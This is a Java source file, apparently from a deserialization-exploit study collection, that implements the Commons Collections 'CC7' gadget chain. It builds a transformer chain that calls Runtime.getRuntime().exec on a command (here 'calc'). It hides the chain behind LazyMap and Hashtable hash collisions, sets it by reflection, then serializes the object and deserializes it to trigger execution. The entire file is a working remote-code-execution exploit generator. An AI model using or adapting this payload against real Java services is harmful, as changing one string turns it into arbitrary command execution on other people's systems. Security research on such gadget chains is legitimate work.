package exp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;
import static tools.SetField.setField;

public class CC7 {
    public static void main(String[] args) throws Exception{
        String command = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        HashMap<Object,Object> hashMap1 = new HashMap<>();
        HashMap<Object,Object> hashMap2 = new HashMap<>();
        Map lazyMap1 = LazyMap.decorate(hashMap1,chainedTransformer);
        lazyMap1.put("yy",1);
        Map lazyMap2 = LazyMap.decorate(hashMap2,chainedTransformer);
        lazyMap2.put("zZ",1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,2);
        setField(chainedTransformer,"iTransformers",transformers);
        lazyMap2.remove("yy");
        serializeBase64Encode(hashtable);
        unserializeBase64Decode("ser.bin");
    }
}
